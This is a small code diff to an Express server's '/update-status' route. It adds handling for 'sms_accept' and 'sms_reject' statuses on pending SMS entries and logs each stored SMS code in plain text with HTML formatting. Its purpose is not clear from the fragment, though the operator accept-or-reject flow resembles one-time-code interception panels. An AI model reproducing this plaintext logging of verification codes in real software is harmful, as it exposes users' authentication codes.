@@ -568,6 +568,13 @@ app.post("/update-status", (req, res) => {
     // ✅ NEW: Handle SMS status updates
     if (pendingSMS[identifier]) {
       pendingSMS[identifier].status = status;
+      if (status === "sms_accept") {
+        const smsCode = pendingSMS[identifier].smsCode;
+        console.log(`✅ ${smsCode} SMS <b>Accepted</b>!`);
+      } else if (status === "sms_reject") {
+        const smsCode = pendingSMS[identifier].smsCode;
+        console.log(`❌ ${smsCode} SMS <b>Rejected</b>!`);
+      }
       return res.json({ ok: true });
     }
 
